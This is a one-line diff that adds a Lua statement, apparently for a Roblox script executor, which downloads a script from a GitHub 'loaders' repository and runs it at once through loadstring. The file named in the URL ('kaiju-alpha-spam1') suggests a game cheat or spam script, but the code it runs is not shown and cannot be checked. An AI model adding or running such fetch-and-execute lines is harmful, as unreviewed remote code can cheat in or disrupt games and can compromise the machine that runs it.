@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam1-naxv1dz3lpv6tf.lua"))()
